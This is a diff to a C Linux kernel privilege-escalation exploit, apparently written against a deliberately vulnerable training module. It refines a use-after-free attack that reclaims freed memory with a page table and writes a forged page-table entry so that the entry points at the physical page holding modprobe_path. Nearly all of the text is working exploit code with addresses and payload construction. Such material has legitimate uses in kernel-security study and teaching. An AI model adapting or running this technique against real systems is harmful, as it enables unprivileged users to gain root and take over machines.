@@ -114,7 +114,7 @@ int act(int act_fd, int code, int n, char *args)
 #define PT_ENTRIES (PAGE_SIZE / 8)
 
 /* Page table bits: Dirty | Accessed | User | Write | Present */
-#define PT_BITS 0x67
+#define PT_BITS 0x67lu
 
 #define PGD_N 64
 
@@ -179,7 +179,11 @@ static void flush_tlb(void *addr, size_t len)
 
 /* Update the address of modprobe_path for your kernel: */
 #define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
-#define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)
+#define KERNEL_TEXT_ADDR 0xffffffff81000000lu
+#define MODPROBE_PATH_ADDR_OFFSET (MODPROBE_PATH_ADDR - KERNEL_TEXT_ADDR)
+#define KERNEL_TEXT_PHYS_ADDR 0x1000000lu
+#define MODPROBE_PATH_PHYS_ADDR (KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_ADDR_OFFSET)
+#define MODPROBE_PATH_PTE_ENTRY ((MODPROBE_PATH_PHYS_ADDR & 0xfffffffffffff000lu) + PT_BITS)
 
 int get_modprobe_path(char *buf)
 {
@@ -313,6 +317,7 @@ int main(void)
 	long current_n = 0;
 	long reserved_from_n = 0;
 	long uaf_n = 0;
+	char act_args[DRILL_ACT_SIZE] = { 0 };
 	void *modprobe_addr;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
@@ -401,17 +406,22 @@ int main(void)
 	printf("[+] done, now go for page table\n");
 
 	printf("[!] create a page table to reclaim the freed memory\n");
-	for (unsigned long long i = 0; i < PT_ENTRIES; i++) {
-		*(unsigned int *)PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
+	for (i = 0; i < PT_ENTRIES; i++) {
+		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
+
+		/* Allocate and populate a new PTE */
+		*addr = 0xcafecafe;
 	}
-	printf("[+] done, vulnerable page table has been created\n");
+	printf("[+] PTE has been created\n");
 
 	printf("[!] perform uaf write using the dangling reference\n");
-	long pte_payload = MODPROBE_PATH_ADDR_PART + PT_BITS;
-	char str_to_drill[16];
-
-	snprintf(str_to_drill, sizeof(str_to_drill), "0x%08lx %d", pte_payload, 0);
-	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, str_to_drill);
+	/*
+	 * Overwrite one entry in PTE, which reclaimed the UAF memory.
+	 * It will point to the page containing modprobe_path.
+	 * DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16.
+	 */
+	snprintf(act_args, sizeof(act_args), "0x%lx 0", MODPROBE_PATH_PTE_ENTRY);
+	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, act_args);
 	if (ret == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
